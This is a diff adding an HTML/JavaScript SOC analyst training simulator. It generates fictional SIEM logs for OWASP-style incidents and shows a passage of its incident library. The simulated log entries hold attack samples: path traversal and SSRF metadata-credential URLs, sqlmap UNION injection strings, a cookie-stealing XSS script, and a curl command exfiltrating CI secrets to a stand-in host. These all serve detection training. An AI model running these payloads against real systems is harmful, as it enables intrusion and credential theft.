@@ -1,0 +1,868 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>SOC Lab — SIEM &amp; SOAR Practice Simulator</title>
+<style>
+:root{--bg:#0a0f1d;--panel:#111a2d;--panel2:#16213a;--line:#23304d;--text:#e6ebf5;--muted:#8d9ab5;--accent:#4cc2ff;--ok:#3ddc97;--warn:#ffb547;--bad:#ff5d6c;--mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--text);font:14px/1.5 system-ui,-apple-system,"Segoe UI",Roboto,sans-serif}
+header{position:sticky;top:0;z-index:5;background:#0a0f1df0;backdrop-filter:blur(6px);border-bottom:1px solid var(--line)}
+.top{display:flex;align-items:center;gap:10px;padding:10px 14px;max-width:1100px;margin:0 auto}
+.logo{font-weight:800;letter-spacing:.3px;font-size:16px}.logo span{color:var(--accent)}
+.status{margin-left:auto;font-size:12px;color:var(--muted);text-align:right}
+nav{display:flex;gap:4px;overflow-x:auto;padding:0 10px 8px;max-width:1100px;margin:0 auto;scrollbar-width:none}
+nav button{flex:none;background:transparent;border:1px solid transparent;color:var(--muted);padding:7px 12px;border-radius:8px;font:inherit;cursor:pointer}
+nav button.on{background:var(--panel2);border-color:var(--line);color:var(--text)}
+nav .badge{background:var(--bad);color:#fff;border-radius:9px;padding:0 6px;font-size:11px;margin-left:4px}
+main{max-width:1100px;margin:0 auto;padding:14px}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:14px;margin-bottom:12px}
+h1{font-size:22px;margin:0 0 6px}h2{font-size:17px;margin:0 0 10px}h3{font-size:14px;margin:12px 0 6px;color:var(--accent)}
+p{margin:6px 0}.muted{color:var(--muted)}.small{font-size:12px}
+.mono{font-family:var(--mono);font-size:12.5px}
+.row{display:flex;gap:8px;align-items:center;flex-wrap:wrap}.grow{flex:1;min-width:180px}
+input,select,textarea{background:#0b1324;border:1px solid var(--line);color:var(--text);border-radius:8px;padding:9px 10px;font:inherit;width:100%}
+textarea{min-height:70px;resize:vertical}
+input:focus,select:focus,textarea:focus{outline:2px solid #4cc2ff55;border-color:var(--accent)}
+.btn{background:var(--panel2);border:1px solid var(--line);color:var(--text);padding:8px 14px;border-radius:8px;font:inherit;cursor:pointer;white-space:nowrap}
+.btn:hover{border-color:var(--accent)}.btn.pri{background:var(--accent);color:#04121f;border-color:var(--accent);font-weight:600}
+.btn.ok{border-color:#3ddc9766;color:var(--ok)}.btn.bad{border-color:#ff5d6c66;color:var(--bad)}.btn.sm{padding:5px 10px;font-size:12px}
+.btn.sel.ok{background:#3ddc9722}.btn.sel.bad{background:#ff5d6c22}
+.chips{display:flex;gap:6px;flex-wrap:wrap;margin-top:10px}
+.chip{background:#0b1324;border:1px solid var(--line);color:var(--muted);border-radius:20px;padding:4px 10px;font-size:12px;cursor:pointer}
+.chip:hover{color:var(--text);border-color:var(--accent)}
+.grid{display:grid;gap:12px;grid-template-columns:1fr}.grid>*{min-width:0}.step>div{min-width:0}
+@media(max-width:600px){.logo .muted{display:none}}
+@media(min-width:820px){.grid.two{grid-template-columns:1fr 1fr}.grid.side{grid-template-columns:240px 1fr}}
+.sev{font-size:11px;font-weight:700;text-transform:uppercase;padding:2px 8px;border-radius:5px}
+.sev.high{background:#ff5d6c22;color:var(--bad)}.sev.medium{background:#ffb54722;color:var(--warn)}.sev.low{background:#4cc2ff22;color:var(--accent)}
+.ev{border-bottom:1px solid var(--line);padding:6px 2px}
+.ev summary{cursor:pointer;list-style:none;font-family:var(--mono);font-size:12px;word-break:break-all}
+.ev summary::-webkit-details-marker{display:none}
+.ev .t{color:var(--muted)}.kv b{color:#9fb3d9;font-weight:500}
+.full{margin:6px 0 4px 12px;font-family:var(--mono);font-size:12px;background:#0b1324;border-radius:8px;padding:8px;word-break:break-all}
+.st{padding:0 6px;border-radius:4px;font-size:11px;background:#23304d}
+.st-auth{background:#3a2a5c}.st-firewall{background:#5c2a2a}.st-proxy{background:#2a4a5c}.st-dns{background:#2a5c45}.st-edr{background:#5c4a2a}.st-email{background:#4a2a5c}
+table{width:100%;border-collapse:collapse;font-family:var(--mono);font-size:12px}
+th,td{text-align:left;padding:6px 8px;border-bottom:1px solid var(--line);word-break:break-all}th{color:var(--muted);font-weight:500}
+.hist{display:flex;align-items:flex-end;gap:3px;height:60px;margin:8px 0 2px}
+.hist div{flex:1;background:var(--accent);opacity:.75;border-radius:3px 3px 0 0;min-height:1px}
+.histl{display:flex;justify-content:space-between;font-size:10px;color:var(--muted);font-family:var(--mono)}
+.fields details{margin-bottom:4px}.fields summary{cursor:pointer;font-size:12.5px;color:#9fb3d9}
+.fv{display:flex;justify-content:space-between;font-size:12px;font-family:var(--mono);padding:2px 6px;cursor:pointer;border-radius:4px;word-break:break-all}
+.fv:hover{background:var(--panel2)}
+.term{background:#050913;border:1px solid var(--line);border-radius:10px;padding:10px;font-family:var(--mono);font-size:12px;min-height:80px;max-height:340px;overflow:auto;white-space:pre-wrap}
+.term .ok{color:var(--ok)}.term .bad{color:var(--bad)}.term .warn{color:var(--warn)}.term .info{color:var(--accent)}
+.step{display:grid;grid-template-columns:28px 1fr;gap:8px;align-items:start;background:var(--panel2);border:1px solid var(--line);border-radius:10px;padding:8px;margin-bottom:8px}
+.step .n{width:24px;height:24px;border-radius:50%;background:var(--accent);color:#04121f;font-weight:700;display:grid;place-items:center;font-size:12px}
+.step .ctl{display:flex;gap:4px;margin-top:6px}
+.mission{display:flex;flex-direction:column;gap:6px}
+.tag{display:inline-block;font-size:11px;padding:1px 8px;border-radius:10px;background:#23304d;color:var(--muted)}
+.flow{display:flex;gap:6px;flex-wrap:wrap}.flow div{flex:1;min-width:120px;background:var(--panel2);border:1px solid var(--line);border-radius:10px;padding:8px;font-size:12px}
+.flow b{display:block;color:var(--accent);font-size:13px}
+.res-item{display:flex;gap:8px;padding:6px 0;border-bottom:1px solid var(--line);font-size:13px}
+.big{font-size:40px;font-weight:800}
+.err{border-color:#ff5d6c66;color:var(--bad)}
+.toggle{display:flex;align-items:center;gap:8px;cursor:pointer}
+.toggle input{width:auto}
+code{font-family:var(--mono);background:#0b1324;padding:1px 5px;border-radius:4px;font-size:12px}
+.hint{background:#ffb54714;border:1px solid #ffb54744;border-radius:8px;padding:8px;margin:6px 0;font-size:13px}
+</style>
+</head>
+<body>
+<header>
+  <div class="top"><div class="logo">SOC<span>Lab</span> <span class="muted small" style="font-weight:400">SIEM · SOAR simulator</span></div><div class="status" id="status">No active mission</div></div>
+  <nav id="nav"></nav>
+</header>
+<main id="view"></main>
+
+<script>
+/* ============ utilities ============ */
+const $=s=>document.querySelector(s);
+const esc=s=>String(s??'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+function mulberry32(a){return function(){a|=0;a=a+0x6D2B79F5|0;let t=Math.imul(a^a>>>15,1|a);t=t+Math.imul(t^t>>>7,61|t)^t;return((t^t>>>14)>>>0)/4294967296}}
+let R=mulberry32(7);
+const rnd=(a,b)=>Math.floor(R()*(b-a+1))+a;
+const pick=a=>a[Math.floor(R()*a.length)];
+const hex=n=>{let s='';for(let i=0;i<n;i++)s+='0123456789abcdef'[Math.floor(R()*16)];return s};
+const BASE=Date.UTC(2026,10,3,9,0,0);
+const T=min=>BASE+Math.round(min*60000);
+const p2=n=>String(n).padStart(2,'0');
+function fmtT(ts){const d=new Date(ts);return `${p2(d.getUTCHours())}:${p2(d.getUTCMinutes())}:${p2(d.getUTCSeconds())}`}
+function fmtV(k,v){if(k==='_time')return fmtT(v);if((k==='bytes'||k==='sum')&&typeof v==='number')return v.toLocaleString('en-US');return v}
+function ev(min,f,mal){return Object.assign({_time:T(min)},f,{_mal:!!mal})}
+const norm=s=>String(s??'').trim().toLowerCase().replace(/^["']|["']$/g,'');
+function matchAny(p,vals){p=norm(p);if(!p)return false;return [].concat(vals).some(v=>{if(v==='*')return true;v=norm(v);return p===v||(p.length>=8&&v.includes(p))||(v.length>=6&&p.includes(v))})}
+let store={};try{store=JSON.parse(localStorage.getItem('soclab_best')||'{}')}catch(e){}
+function saveBest(){try{localStorage.setItem('soclab_best',JSON.stringify(store))}catch(e){}}
+
+/* ============ fictional company ============ */
+const PEOPLE={
+ alice:{host:'WS-01',ip:'10.0.1.11',dept:'HR',title:'HR Officer'},
+ bob:{host:'WS-02',ip:'10.0.1.12',dept:'Finance',title:'Accountant'},
+ rahim:{host:'WS-03',ip:'10.0.1.13',dept:'IT',title:'System Administrator'},
+ karim:{host:'WS-04',ip:'10.0.1.14',dept:'Sales',title:'Sales Executive'},
+ nusrat:{host:'WS-05',ip:'10.0.1.15',dept:'Marketing',title:'Marketing Lead'},
+ farhan:{host:'WS-06',ip:'10.0.1.16',dept:'Finance',title:'Payroll Officer'},
+ sadia:{host:'WS-07',ip:'10.0.1.17',dept:'Legal',title:'Legal Counsel'},
+ tanvir:{host:'WS-08',ip:'10.0.1.18',dept:'Finance',title:'Finance Manager'}};
+const SERVICE={svc_backup:'Service account — nightly backups on SRV-WEB01',deploy:'Service account — CI/CD deployments to SRV-WEB01',webadmin:'Shared admin account for SRV-WEB01 (legacy)',svc_nessus:'Service account — IT Security, owner: rahim. Purpose: authorised credentialed vulnerability scanning'};
+const ASSETS={'10.0.2.10':'SRV-WEB01 — public-facing web server (DMZ)','10.0.2.20':'SRV-FILE01 — file server (Finance, HR shares)','10.0.2.5':'SRV-DC01 — domain controller','10.0.1.250':'IT-SCAN01 — vulnerability scanner, owner: IT Security'};
+Object.entries(PEOPLE).forEach(([u,p])=>ASSETS[p.ip]=`${p.host} — workstation of ${u} (${p.dept})`);
+const BENIGN_DOM=['www.google.com','outlook.office365.com','teams.microsoft.com','github.com','www.thedailystar.net','drive.google.com','windowsupdate.com','slack.com','zoom.us','stackoverflow.com','cdn.jsdelivr.net','www.linkedin.com'];
+const CAT={'www.google.com':'search','outlook.office365.com':'business','teams.microsoft.com':'business','github.com':'software-dev','www.thedailystar.net':'news','drive.google.com':'cloud-storage','windowsupdate.com':'software-update','slack.com':'business','zoom.us':'business','stackoverflow.com':'software-dev','cdn.jsdelivr.net':'cdn','www.linkedin.com':'social'};
+const DOM_IP={};BENIGN_DOM.forEach((d,i)=>DOM_IP[d]=['142.250.183.'+(10+i),'52.96.'+i+'.10','104.18.32.'+(7+i)][i%3]);
+const PROCS=['chrome.exe','outlook.exe','teams.exe','excel.exe','winword.exe','svchost.exe','onedrive.exe'];
+const PROC_HASH={};PROCS.forEach(p=>PROC_HASH[p]=hex(64));
+const MAIL_SENDERS=['hr@company.local','it-ops@company.local','noreply@github.com','newsletter@thedailystar.net','ceo@company.local','calendar@company.local'];
+const SUBJ=['Weekly team sync','Updated leave policy','Your pull request was merged','Morning headlines','Q4 targets','Meeting invitation: project review'];
+
+function noise(n){const E=[];const users=Object.keys(PEOPLE);
+ for(let i=0;i<n;i++){const m=R()*120,u=pick(users),p=PEOPLE[u],r=R();
+  if(r<.2)E.push(ev(m,{sourcetype:'auth',event:pick(['windows_logon','windows_logon','o365_login']),host:'SRV-DC01',user:u,src_ip:p.ip,action:R()<.95?'success':'failure',country:'BD'}));
+  else if(r<.45){const d=pick(BENIGN_DOM);E.push(ev(m,{sourcetype:'firewall',host:'FW-EDGE01',src_ip:p.ip,dest_ip:DOM_IP[d],dest_port:pick([443,443,443,80]),direction:'outbound',action:R()<.97?'allowed':'blocked',bytes:rnd(2000,3000000)}))}
+  else if(r<.65){const d=pick(BENIGN_DOM);E.push(ev(m,{sourcetype:'proxy',user:u,src_ip:p.ip,domain:d,url:'https://'+d+'/'+pick(['','index','api/v1/sync','search','mail','home']),method:pick(['GET','GET','GET','POST']),category:CAT[d],action:'allowed',bytes:rnd(1000,800000)}))}
+  else if(r<.80){const d=pick(BENIGN_DOM);E.push(ev(m,{sourcetype:'dns',host:p.host,src_ip:p.ip,query:d,answer:DOM_IP[d]}))}
+  else if(r<.94){const pr=pick(PROCS);E.push(ev(m,{sourcetype:'edr',event:'process_start',host:p.host,user:u,process:pr,parent:'explorer.exe',cmdline:pr,hash:PROC_HASH[pr]}))}
+  else E.push(ev(m,{sourcetype:'email',sender:pick(MAIL_SENDERS),recipient:u+'@company.local',subject:pick(SUBJ),verdict:'delivered'}));
+ }return E}
+
+/* ============ incident library (OWASP Top 10:2025 + common SOC alerts) ============ */
+const UAS=['Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/130.0','Mozilla/5.0 (iPhone; CPU iPhone OS 18_1) Safari/604.1','Mozilla/5.0 (Linux; Android 14) Chrome/130.0 Mobile','Mozilla/5.0 (Windows NT 10.0; rv:132.0) Firefox/132.0'];
+let CUST=[];
+const bdIP=()=>[...pick([[103,rnd(100,250)],[37,111],[27,147],[114,130]]),rnd(0,255),rnd(1,254)].join('.');
+function buildCustomers(){CUST=['arif','mitu','sumon','rina','jamal','lima','sakib','tania','rafi','nila','imran','ruma'].map((u,i)=>({u:'cust_'+u,ip:bdIP(),ua:pick(UAS),oid:5000+i*13}))}
+const WEB=(m,f,mal)=>ev(m,Object.assign({sourcetype:'web',host:'SRV-WEB01',src_ip:'',method:'GET',uri:'/',status:200,user:'-',bytes:rnd(400,30000),user_agent:UAS[0],scheme:'https',response_ms:rnd(20,300)},f),mal);
+function webNoise(n){const E=[];for(let i=0;i<n;i++){const m=R()*120,c=pick(CUST),r=R(),b={src_ip:c.ip,user_agent:c.ua};let f;
+ if(r<.33)f={uri:'/products?id='+rnd(100,400)};else if(r<.45)f={uri:'/'};else if(r<.55)f={uri:'/static/app.js'};
+ else if(r<.66)f={method:'POST',uri:'/login',user:c.u,status:R()<.96?200:401};else if(r<.76)f={uri:'/cart',user:c.u};
+ else if(r<.84)f={uri:'/api/orders/'+(c.oid+rnd(0,2)),user:c.u};else if(r<.92)f={uri:'/search?q='+pick(['saree','phone','rice+cooker','shoes','headphones'])};
+ else if(r<.96)f={uri:'/favicon.ico',status:404,bytes:0};else f={method:'POST',uri:'/checkout',user:c.u};
+ if(R()<.004)f.status=500;E.push(WEB(m,Object.assign(b,f)))}return E}
+ASSETS['10.0.2.30']='BUILD01 — CI/CD build server (Jenkins)';
+
+const INC=[
+/* ---------------- OWASP Top 10:2025 ---------------- */
+{id:'a01_idor',cat:'OWASP',tag:'A01:2025 Broken Access Control',type:'Broken access control — IDOR',name:'Order enumeration (IDOR)',
+ desc:'A logged-in user changes the ID in an API URL and reads other customers\' records, because the server checks login but not ownership.',
+ gen(c){const a=c.ip(),acct=pick(['cust_hasan99','cust_test01','cust_shadow']),ua='python-requests/2.32.3',m=c.t(),n=rnd(80,140),st=rnd(1000,1100),E=[];
+  E.push(WEB(m,{src_ip:a,method:'POST',uri:'/login',user:acct,user_agent:ua},1));
+  for(let i=0;i<n;i++)E.push(WEB(m+1+i*.04,{src_ip:a,uri:'/api/orders/'+(st+i),user:acct,user_agent:ua,bytes:rnd(900,2500)},1));
+  return{events:E,questions:[{q:'Which customer account was used to enumerate orders?',a:[acct]},{q:'About how many orders were accessed? (number)',num:n,tol:10}],
+  required:[['revoke_sessions',acct],['block_ip',a],['create_ticket','*']],recommended:[['enrich_ip',a],['notify','*']],
+  intel:{[a]:'SUSPICIOUS — cloud VPS, seen running scrapers against e-commerce APIs.'},
+  story:`Account <b>${acct}</b> logged in from ${a} and a script walked /api/orders/${st}…${st+n-1}, downloading ${n} other customers' orders. The API returned 200 for every ID — it checked that you were logged in, not that the order was yours. Fix: server-side ownership checks.`,
+  tags:['OWASP A01:2025','CWE-639 Authorization Bypass (IDOR)','T1213 Data from Information Repositories'],
+  hints:['sourcetype=web uri=/api/orders/* | stats dc(uri) by user','Normal customers open 1–3 of their own orders. Who opened 100+?']}}},
+{id:'a01_trav',cat:'OWASP',tag:'A01:2025 Broken Access Control',type:'Broken access control — path traversal',name:'Path traversal on /download',
+ desc:'"../" sequences in a file parameter let an attacker read files outside the web folder, such as /etc/passwd or config files.',
+ gen(c){const a=c.ip(),m=c.t(),E=[];const ps=['../etc/passwd','../../etc/passwd','../../../etc/passwd','..%2f..%2f..%2fetc%2fpasswd','../../../../etc/passwd','../../../../etc/shadow','../../../../var/www/shop/.env','../../../../proc/self/environ'];
+  ps.forEach((p,i)=>{const ok=p==='../../../../etc/passwd'||p==='../../../../var/www/shop/.env';E.push(WEB(m+i*.3,{src_ip:a,uri:'/download?file='+p,status:ok?200:(p.includes('shadow')?403:404),bytes:ok?rnd(1800,3200):0,user_agent:'curl/8.5.0'},1))});
+  return{events:E,questions:[{q:'Which IP performed the traversal?',a:[a]},{q:'Which application secrets file was read successfully?',a:['/var/www/shop/.env','.env']}],
+  required:[['block_ip',a],['create_ticket','*']],recommended:[['enrich_ip',a]],
+  intel:{[a]:'MALICIOUS — scanning for LFI/path traversal on many sites this week.'},
+  story:`${a} fed "../" sequences into <code>/download?file=</code>. Two requests returned 200: <b>/etc/passwd</b> and the shop's <b>.env</b> (database password, API keys). The encoded %2f attempt was not caught by the "../" rule — a good reminder that attackers encode payloads. Fix: canonicalise paths and allow-list files; rotate every secret in .env.`,
+  tags:['OWASP A01:2025','CWE-22 Path Traversal','T1083 File and Directory Discovery'],hints:['sourcetype=web uri=*../* | table _time, src_ip, uri, status, bytes','Which requests got status=200?']}}},
+{id:'a01_ssrf',cat:'OWASP',tag:'A01:2025 Broken Access Control (SSRF)',type:'SSRF — server-side request forgery',name:'SSRF to cloud metadata',
+ desc:'The app fetches any URL a user supplies, so an attacker makes the server request internal addresses like the cloud metadata service to steal credentials.',
+ gen(c){const a=c.ip(),m=c.t(),cc=pick(['US','DE','BR']),E=[];
+  [['http://example.com/cat.png',200],['http://127.0.0.1:8080/admin',200],['http://169.254.169.254/latest/meta-data/',200],['http://169.254.169.254/latest/meta-data/iam/security-credentials/',200],['http://169.254.169.254/latest/meta-data/iam/security-credentials/shop-web-role',200]].forEach(([u,s],i)=>E.push(WEB(m+i*.5,{src_ip:a,uri:'/api/fetch-image?url='+u,status:s,bytes:rnd(300,1500),user_agent:'Mozilla/5.0 (X11; Linux x86_64) Firefox/131.0'},1)));
+  E.push(ev(m+2.1,{sourcetype:'firewall',host:'FW-CORE01',src_ip:'10.0.2.10',dest_ip:'169.254.169.254',dest_port:80,direction:'internal',action:'allowed',bytes:rnd(800,1500)},1));
+  E.push(ev(m+rnd(8,14),{sourcetype:'auth',event:'cloud_api_call',host:'CloudTrail',user:'shop-web-role',src_ip:a,action:'success',country:cc,msg:'ListBuckets, GetObject customer-exports/*'},1));
+  return{events:E,questions:[{q:'Which IP sent the SSRF payloads?',a:[a]},{q:'Which cloud role\'s credentials were stolen?',a:['shop-web-role']}],
+  required:[['block_ip',a],['revoke_sessions','shop-web-role'],['create_ticket','*']],recommended:[['enrich_ip',a]],
+  intel:{[a]:`MALICIOUS — VPS (${cc}) linked to cloud credential theft.`},
+  story:`${a} abused <code>/api/fetch-image?url=</code> to make SRV-WEB01 call <b>169.254.169.254</b>, the cloud metadata service, and read temporary keys for <b>shop-web-role</b>. Minutes later those keys were used from ${a} (${cc}) to list storage buckets. SSRF is now part of A01 in the 2025 list. Fix: allow-list fetch targets, block metadata IPs, enforce IMDSv2.`,
+  tags:['OWASP A01:2025 (SSRF)','CWE-918 SSRF','T1552.005 Cloud Instance Metadata API'],hints:['sourcetype=web uri=*169.254.169.254*','Then look for logins using the stolen role: sourcetype=auth user=shop-web-role']}}},
+{id:'a02_misconf',cat:'OWASP',tag:'A02:2025 Security Misconfiguration',type:'Security misconfiguration — exposed files',name:'Exposed .git and .env files',
+ desc:'A content-discovery scan finds files that should never be public (.git, .env, backups) because the web server was deployed with unsafe defaults.',
+ gen(c){const a=c.ip(),m=c.t(),ua='gobuster/3.6',E=[];const paths=['/admin','/backup.zip','/wp-admin/','/phpinfo.php','/config.php.bak','/.svn/entries','/server-status','/db.sql','/old/','/test/','/api/swagger.json','/.DS_Store','/debug','/console','/actuator/env','/.htpasswd','/dump.sql','/site.tar.gz','/.aws/credentials','/web.config'];
+  for(let i=0;i<rnd(45,60);i++)E.push(WEB(m+i*.04,{src_ip:a,uri:i<paths.length?paths[i]:'/dir'+rnd(1,999)+'/',status:404,bytes:0,user_agent:ua},1));
+  E.push(WEB(m+2.5,{src_ip:a,uri:'/.git/config',status:200,bytes:rnd(250,400),user_agent:ua},1));E.push(WEB(m+2.6,{src_ip:a,uri:'/.env',status:200,bytes:rnd(600,900),user_agent:ua},1));
+  return{events:E,questions:[{q:'Which scanning tool was used? (from user_agent)',a:['gobuster']},{q:'Name one sensitive file that was served with status 200',a:['/.env','/.git/config','.env','.git']}],
+  required:[['block_ip',a],['create_ticket','*']],recommended:[['enrich_ip',a],['notify','*']],
+  intel:{[a]:'SUSPICIOUS — mass content-discovery scanning.'},
+  story:`${a} ran <b>gobuster</b> against the shop. Most paths 404'd, but <b>/.git/config</b> and <b>/.env</b> returned 200 — the deployment copied the repo and secrets into the web root. Fix: deny dotfiles in the web server, deploy build artefacts only, and rotate all secrets that were in .env.`,
+  tags:['OWASP A02:2025','CWE-538 Sensitive info in accessible file','T1595.003 Wordlist Scanning'],hints:['sourcetype=web status=404 | stats count by src_ip','Then: sourcetype=web src_ip="<ip>" status=200']}}},
+{id:'a03_supply',cat:'OWASP',tag:'A03:2025 Software Supply Chain Failures',type:'Supply chain — malicious package',name:'Typosquatted npm package on build server',
+ desc:'A dependency with a look-alike name runs an install script on the build server that steals tokens and secrets.',
+ gen(c){const pkg=pick(['expresss-session','colorsjs-utils','reqeusts-http']),dom=pick(['npm-stats-cdn.example','pkg-telemetry.example']),dip=c.ip(),m=c.t(),H='BUILD01',HIP='10.0.2.30',E=[];
+  const e=(d,f)=>E.push(ev(m+d,Object.assign({sourcetype:'edr',event:'process_start',host:H,user:'deploy'},f),1));
+  e(0,{process:'npm',parent:'jenkins',cmdline:'npm install '+pkg+'@2.1.4',hash:hex(64)});e(.3,{process:'node',parent:'npm',cmdline:'node scripts/postinstall.js',hash:hex(64)});
+  e(.4,{process:'curl',parent:'node',cmdline:`curl -s -X POST https://${dom}/collect -d @/home/deploy/.npmrc -d @/var/lib/jenkins/secrets/master.key`,hash:hex(64)});
+  E.push(ev(m+.41,{sourcetype:'dns',host:H,src_ip:HIP,query:dom,answer:dip},1));E.push(ev(m+.42,{sourcetype:'firewall',host:'FW-EDGE01',src_ip:HIP,dest_ip:dip,dest_port:443,direction:'outbound',action:'allowed',bytes:rnd(3000,9000)},1));
+  return{events:E,questions:[{q:'Which malicious package was installed?',a:[pkg]},{q:'To which domain were secrets sent?',a:[dom]}],
+  required:[['isolate_host',[H,HIP]],['block_domain',dom],['create_ticket','*']],recommended:[['reset_password','deploy'],['block_ip',dip]],
+  intel:{[dom]:'MALICIOUS — exfil endpoint used by typosquatted npm packages.',[dip]:'MALICIOUS — hosts '+dom},
+  story:`A developer added <b>${pkg}</b> (a typo of a popular package). Its postinstall script ran on <b>BUILD01</b> and used curl to POST the npm token and Jenkins master key to <b>${dom}</b>. Fix: remove the package, rotate every CI secret, pin dependencies with a lockfile and use an SBOM / package allow-list.`,
+  tags:['OWASP A03:2025','CWE-1357 Reliance on insufficiently trustworthy component','T1195.002 Compromise Software Supply Chain'],hints:['sourcetype=edr host=BUILD01 | table _time, process, parent, cmdline','Why would node start curl during npm install?']}}},
+{id:'a04_crypto',cat:'OWASP',tag:'A04:2025 Cryptographic Failures',type:'Cryptographic failure — cleartext credentials',name:'Passwords sent over plain HTTP',
+ desc:'A legacy endpoint sends usernames and passwords over unencrypted HTTP (in the URL), so anyone on the network path can steal them.',
+ gen(c){const a=c.ip(),m=c.t(),vs=[...CUST].sort(()=>R()-.5),E=[];vs.slice(0,10).forEach((v,i)=>E.push(WEB(m+i*.6,{src_ip:v.ip,uri:`/m/login?user=${v.u}&pass=********`,user:v.u,scheme:'http',user_agent:'ShopApp/1.2 (Android)'},1)));
+  const vic=vs.slice(0,3);vic.forEach((v,i)=>E.push(WEB(m+12+i*.5,{src_ip:a,method:'POST',uri:'/login',user:v.u,user_agent:UAS[3]},1)));
+  return{events:E,questions:[{q:'Which endpoint leaks credentials in cleartext?',a:['/m/login']},{q:'Which IP logged in to several customer accounts?',a:[a]}],
+  required:[['create_ticket','*'],['block_ip',a],['revoke_sessions',vic.map(v=>v.u)]],recommended:[['notify','*']],
+  intel:{[a]:'SUSPICIOUS — public Wi-Fi hotspot provider range.'},
+  story:`The old Android app (ShopApp 1.2) logs in via <b>http://…/m/login?user=…&pass=…</b> — no TLS, password in the URL. Someone on the same network captured them; ${a} then logged in as ${vic.map(v=>v.u).join(', ')}. Fix: force HTTPS + HSTS, retire the endpoint, never put secrets in URLs, reset affected passwords.`,
+  tags:['OWASP A04:2025','CWE-319 Cleartext Transmission','T1040 Network Sniffing'],hints:['sourcetype=web scheme=http | table _time, src_ip, uri, user','Then: sourcetype=web uri=/login status=200 | stats dc(user) by src_ip']}}},
+{id:'a05_sqli',cat:'OWASP',tag:'A05:2025 Injection',type:'Injection — SQL injection',name:'SQL injection with sqlmap',
+ desc:'User input is concatenated into a SQL query, letting the attacker change the query and dump database tables.',
+ gen(c){const a=c.ip(),m=c.t(),ua='sqlmap/1.8.4#stable',E=[];const p=["105'","105'+AND+1=1--+-","105'+AND+1=2--+-","105+AND+SLEEP(5)--+-","105+ORDER+BY+1--+-","105+ORDER+BY+5--+-","105+UNION+ALL+SELECT+NULL--+-","105+UNION+ALL+SELECT+NULL,NULL,NULL--+-","105+UNION+ALL+SELECT+table_name,NULL,NULL+FROM+information_schema.tables--+-","105+UNION+ALL+SELECT+column_name,NULL,NULL+FROM+information_schema.columns+WHERE+table_name='users'--+-","105+UNION+ALL+SELECT+email,password_hash,phone+FROM+users--+-"];
+  for(let r=0;r<3;r++)p.forEach((x,i)=>{const last=i===p.length-1;E.push(WEB(m+r*1.5+i*.08,{src_ip:a,uri:'/products?id='+x,status:i===0||i===5?500:200,bytes:last?rnd(380000,520000):rnd(2000,9000),response_ms:x.includes('SLEEP')?5000+rnd(1,80):rnd(30,200),user_agent:ua},1))});
+  return{events:E,questions:[{q:'Which IP ran the SQL injection?',a:[a]},{q:'Which database table was dumped?',a:['users']},{q:'Which tool was used?',a:['sqlmap']}],
+  required:[['block_ip',a],['create_ticket','*'],['notify','*']],recommended:[['enrich_ip',a]],
+  intel:{[a]:'MALICIOUS — automated SQLi scanning (sqlmap) reported by multiple honeypots.'},
+  story:`${a} used <b>sqlmap</b> against <code>/products?id=</code>. Boolean and time-based tests (SLEEP → 5 s responses) confirmed injection; UNION queries enumerated information_schema and finally dumped the <b>users</b> table (~450 KB response). That is a data breach → Legal/DPO must be notified. Fix: parameterised queries, least-privilege DB user, WAF.`,
+  tags:['OWASP A05:2025','CWE-89 SQL Injection','T1190 Exploit Public-Facing Application'],hints:['sourcetype=web uri=*select* | table _time, src_ip, uri, status, bytes','Look at the response bytes of the last UNION request']}}},
+{id:'a05_xss',cat:'OWASP',tag:'A05:2025 Injection',type:'Injection — cross-site scripting (XSS)',name:'Stored XSS in product reviews',
+ desc:'Script code saved in a review runs in other customers\' browsers and steals their session cookies.',
+ gen(c){const a=c.ip(),m=c.t(),pid=rnd(200,399),dom=pick(['cdn-img-cache.example','stats-collector.example']),E=[];
+  E.push(WEB(m,{src_ip:a,method:'POST',uri:`/api/reviews?product=${pid}&text=Great!<script>new Image().src='//${dom}/c?'+document.cookie<\/script>`,status:201,user:'cust_reviewer7',user_agent:UAS[0]},1));
+  const vs=[...CUST].sort(()=>R()-.5).slice(0,4);vs.forEach((v,i)=>E.push(WEB(m+3+i*2,{src_ip:v.ip,uri:'/products?id='+pid,user:v.u,user_agent:v.ua},1)));
+  const vic=vs[0];E.push(WEB(m+15,{src_ip:a,uri:'/account/addresses',user:vic.u,user_agent:UAS[0]},1));E.push(WEB(m+15.5,{src_ip:a,method:'POST',uri:'/account/change-email',user:vic.u,user_agent:UAS[0]},1));
+  return{events:E,questions:[{q:'To which domain are cookies being sent?',a:[dom]},{q:'Which product page holds the payload? (id)',a:[String(pid)]}],
+  required:[['create_ticket','*'],['revoke_sessions',vs.map(v=>v.u)],['block_ip',a]],recommended:[['block_domain',dom]],
+  intel:{[dom]:'MALICIOUS — cookie-collector domain.',[a]:'SUSPICIOUS — residential proxy network.'},
+  story:`${a} posted a review on product ${pid} containing a <b>&lt;script&gt;</b> that sends document.cookie to <b>${dom}</b>. Everyone who viewed the page leaked their session; ${a} then reused <b>${vic.u}</b>'s session to change the account email. Fix: output-encode user content, HttpOnly cookies, CSP; delete the review; revoke sessions of everyone who viewed it.`,
+  tags:['OWASP A05:2025','CWE-79 Cross-site Scripting','T1539 Steal Web Session Cookie'],hints:['sourcetype=web uri=*<script* | table _time, src_ip, uri','Who viewed that product afterwards? Did the attacker IP use any of their accounts?']}}},
+{id:'a06_design',cat:'OWASP',tag:'A06:2025 Insecure Design',type:'Insecure design — business logic abuse',name:'Unlimited coupon stacking',
+ desc:'The checkout was designed without a rule that a coupon can be used once, so a user stacks it until the order is nearly free.',
+ gen(c){const a=c.ip(),m=c.t(),acct=pick(['cust_dealhunter','cust_rakib77','cust_bargain']),code=pick(['WELCOME500','FLASH300','NEWUSER250']),n=rnd(20,35),E=[];
+  for(let i=0;i<n;i++)E.push(WEB(m+i*.1,{src_ip:a,method:'POST',uri:'/api/cart/apply-coupon?code='+code,user:acct,user_agent:'okhttp/4.12',msg:`discount applied, cart total ${Math.max(0,24000-i*800)} BDT`},1));
